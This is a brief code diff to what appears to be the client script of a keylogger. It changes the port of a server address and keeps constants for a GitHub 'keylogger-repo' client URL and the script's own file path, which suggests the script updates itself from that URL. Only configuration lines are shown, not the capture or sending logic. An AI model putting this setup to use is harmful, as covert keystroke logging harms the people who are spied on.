@@ -5,7 +5,7 @@ import os
 import sys
 
 # Constants
-SERVER_URL = 'http://192.168.15.16:6969'  # Server IP and changed port to 6969
+SERVER_URL = 'http://192.168.15.16:8080'  # Server IP and changed port to 8080
 GITHUB_URL = 'https://raw.githubusercontent.com/JJcoded/keylogger-repo/refs/heads/main/client.py'
 LOCAL_PATH = os.path.abspath(__file__)
 
